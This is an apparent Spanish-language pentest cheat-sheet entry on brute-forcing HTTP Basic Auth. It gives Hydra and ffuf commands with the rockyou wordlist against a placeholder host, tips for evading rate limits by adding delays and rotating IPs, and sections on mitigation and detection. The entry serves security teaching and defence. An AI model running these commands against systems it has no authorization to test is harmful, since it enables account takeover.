---
topic: HTTP Basic Auth brute force
tags: [web, basic-auth, brute-force, hydra]
---

# HTTP Basic Auth brute force

[🇬🇧 English](http-basic-auth.en.md) | **Español**

## Concepto

HTTP Basic Auth envía `usuario:contraseña` en Base64. Sin TLS, cualquiera puede leerlo; sin rate limit, se puede probar un diccionario hasta acertar.

## Cuándo aplica

- Respuesta `401` con `WWW-Authenticate: Basic realm="..."`.
- Sin bloqueo por intentos.
- Contraseñas débiles o por defecto.

## Requisitos

1. URL protegida.
2. Usuario probable.
3. Diccionario y Hydra/ffuf.

## Procedimiento

```bash
curl -i http://<HOST>/
hydra -l admin -P /usr/share/wordlists/rockyou.txt <HOST> http-get /
```

Con `ffuf`:

```bash
ffuf -u http://<HOST>/ -w users.txt:USER -w passwords.txt:PASS -e -mode clusterbomb
```

Al obtener `200`, se accede:

```bash
curl -u '<user>:<password>' http://<HOST>/
```

## Variantes

- **Basic Auth en API**: probar `Authorization: Basic`.
- **Usuario desconocido**: enumerar por mensajes o timing.
- **Rate limit débil**: añadir delays y rotar IPs.
- **Credenciales por defecto**: probar antes del diccionario.

## Limitaciones

- TLS no impide la fuerza bruta, solo el sniffing.
- Un WAF puede bloquear tras pocos intentos.
- La cuenta puede bloquearse.
- El diccionario puede no contener la clave.

## Mitigación

- TLS y autenticación moderna (OIDC/MFA).
- Rate limit y bloqueo progresivo.
- Contraseñas fuertes y únicas.
- Monitorizar 401 y alertar.

## Detección

- Muchos `401` desde una IP.
- User-agent de Hydra/ffuf.
- Intentos con usuarios comunes.
- Acceso exitoso tras ráfaga de fallos.

MITRE ATT&CK: T1110 (Brute Force), T1078 (Valid Accounts).

## Referencias

- <https://www.rfc-editor.org/rfc/rfc7617>
- <https://github.com/vanhauser-thc/thc-hydra>
- <https://attack.mitre.org/techniques/T1110/>
